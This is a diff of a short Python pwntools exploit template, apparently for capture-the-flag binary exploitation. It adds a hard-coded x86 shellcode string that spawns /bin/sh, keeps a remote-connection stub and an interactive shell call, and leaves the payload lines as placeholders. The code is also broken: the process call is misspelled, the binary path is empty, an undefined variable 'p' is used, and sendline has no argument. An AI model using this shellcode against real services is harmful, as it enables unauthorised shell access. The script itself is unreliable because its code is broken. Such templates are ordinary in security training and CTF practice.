@@ -1,21 +1,17 @@
 from pwn import *
 
-HOST = ""
-PORT = 
 conn= ptgrocess("./")
 #conn = remote(HOST, PORT)
 
-ret = conn.recv() #出力をEOFまで
-ret = conn.recvuntil(':') #出力を:まで
-ret = p.recvline() # 改行まで
-ret = p.recvline(timeout=0.01) # timeout
+shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
 
-log.info(ret) 
+ret = conn.recvuntil(':') 
+ret = p.recvline() 
 
 payload = ""
-payload += p32(shell)
+#payload += p32(0x)
+#payload += p64(0x)
 
-conn.sendline()　#shellcode
-
+conn.sendline()
 
 conn.interactive()
